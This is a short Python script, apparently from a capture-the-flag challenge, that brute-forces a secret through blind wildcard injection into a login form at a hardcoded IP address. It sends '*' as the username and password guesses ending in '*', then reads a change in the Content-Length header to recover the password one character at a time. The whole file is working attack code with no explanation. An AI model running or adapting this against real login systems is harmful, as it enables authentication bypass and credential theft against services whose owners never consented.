import requests
from string import ascii_lowercase, ascii_uppercase

url = "http://138.68.182.108:31009/"

chars = ascii_lowercase + ascii_uppercase + '0123456789_{}+-!@#$%^&`~/\\\'"()'

res = ''

run = True
while (run):
	'''
	loops forever, to find correct characters that pass
	'''
	for c in chars:
		tmp = res + c + '*'
		data = {
			'username': '*',
			'password': tmp
		}
		r = requests.post(url + 'login', data)

		if (r.headers['Content-Length'] != '2214' ):
			print(r.headers)
			res += c
			break
	print(res)